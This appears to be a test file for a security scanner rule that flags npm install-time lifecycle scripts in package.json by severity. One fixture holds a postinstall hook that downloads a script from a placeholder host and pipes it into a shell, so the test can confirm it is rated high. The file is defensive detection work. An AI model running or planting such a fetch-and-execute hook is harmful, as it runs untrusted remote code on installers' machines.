import { test } from 'node:test';
import assert from 'node:assert/strict';
import { detect, RULE } from '../skills/repoflags/scripts/lib/rules/lifecycle.mjs';
import { pkg, HIGH_CASES, ALLOWLISTED } from './fixtures/lifecycle-cases.mjs';

function run(map) {
  const files = new Map(Object.entries(map).map(([k, v]) => [k, { text: v, size: v.length }]));
  return detect(files, { options: {}, addSecret() {} });
}

test('postinstall is medium with key line and evidence', () => {
  const r = run({ 'package.json': pkg({ postinstall: 'node ./scripts/setup.js' }) });
  assert.equal(r.signals.length, 1);
  const s = r.signals[0];
  assert.equal(s.rule, RULE);
  assert.equal(s.severity, 'medium');
  assert.equal(s.file, 'package.json');
  assert.equal(s.line, 5);
  assert.equal(s.evidence, 'postinstall: node ./scripts/setup.js');
});

for (const [name, cmd, ids] of HIGH_CASES) {
  test(`suspicious command is high: ${name}`, () => {
    const r = run({ 'package.json': pkg({ preinstall: cmd }) });
    assert.equal(r.signals.length, 1);
    assert.equal(r.signals[0].severity, 'high');
    for (const id of ids) assert.ok(r.signals[0].evidence.includes(id), `${id} in ${r.signals[0].evidence}`);
    assert.ok(!/[()]/.test(r.signals[0].evidence.split('|')[0]), 'indicator ids carry no parentheses');
  });
}

for (const [hook, cmd] of ALLOWLISTED) {
  test(`allowlisted tooling is info: ${cmd}`, () => {
    const r = run({ 'package.json': pkg({ [hook]: cmd }) });
    assert.equal(r.signals.length, 1);
    assert.equal(r.signals[0].severity, 'info');
  });
}

test('prepublish and every hook are reported', () => {
  const hooks = ['preinstall', 'install', 'postinstall', 'preprepare', 'prepare', 'postprepare', 'prepublish'];
  for (const h of hooks) {
    const r = run({ 'package.json': pkg({ [h]: 'tsc' }) });
    assert.equal(r.signals.length, 1, h);
    assert.equal(r.signals[0].severity, 'medium', h);
  }
});

test('non-lifecycle scripts give no signal', () => {
  const r = run({ 'package.json': pkg({ build: 'tsc', dev: 'vite', test: 'node --test' }) });
  assert.equal(r.signals.length, 0);
});

test('nested package.json is reported with its own file', () => {
  const r = run({ 'packages/a/package.json': pkg({ postinstall: 'node x.js' }) });
  assert.equal(r.signals.length, 1);
  assert.equal(r.signals[0].file, 'packages/a/package.json');
});

test('node_modules manifests are not examined', () => {
  const r = run({ 'node_modules/x/package.json': pkg({ postinstall: 'node x.js' }) });
  assert.equal(r.signals.length, 0);
});

// Contract changed by review rules CR-04 (handover from core CR-02): a JSON that the author can break on purpose
// must not end in "no signals". The notVerified entry stays exactly as before; a medium signal is added.
test('invalid JSON goes to notVerified without throwing and is a medium signal', () => {
  const r = run({ 'package.json': '{ not json' });
  assert.equal(r.signals.length, 1);
  assert.equal(r.signals[0].rule, RULE);
  assert.equal(r.signals[0].severity, 'medium');
  assert.equal(r.signals[0].title, 'package.json could not be parsed: install scripts not fully checked');
  assert.deepEqual(r.notVerified, [{ check: RULE, reason: 'unparseable package.json: package.json' }]);
});

test('CR-04: a broken package.json is still scanned as text for lifecycle hooks', () => {
  const text = '{ "name": "x", "scripts": { "postinstall": "curl -s https://example.invalid/a | sh" }, oops }';
  const r = run({ 'package.json': text });
  const hook = r.signals.find((s) => s.severity === 'high');
  assert.ok(hook, JSON.stringify(r.signals));
  assert.equal(hook.rule, RULE);
  assert.ok(hook.evidence.includes('postinstall: curl'), hook.evidence);
});

test('scripts of wrong shape are ignored', () => {
  for (const text of ['{"scripts": 5}', '{"scripts": null}', '{"scripts": ["a"]}', '{"scripts": {"postinstall": 7}}', '[]', 'null']) {
    const r = run({ 'package.json': text });
    assert.equal(r.signals.length, 0, text);
  }
});

test('pathological 50k-character script is fast and evidence is bounded', () => {
  const t0 = Date.now();
  const r = run({ 'package.json': pkg({ postinstall: 'node ' + 'a'.repeat(50000) }) });
  assert.ok(Date.now() - t0 < 200, `took ${Date.now() - t0} ms`);
  assert.equal(r.signals.length, 1);
  assert.ok(r.signals[0].evidence.length <= 160);
});

test('pathological repeated tokens do not hang', () => {
  const t0 = Date.now();
  const r = run({ 'package.json': pkg({ postinstall: 'node ' + 'a.'.repeat(5000) + '!' }) });
  assert.ok(Date.now() - t0 < 1000);
  assert.ok(Array.isArray(r.signals));
});
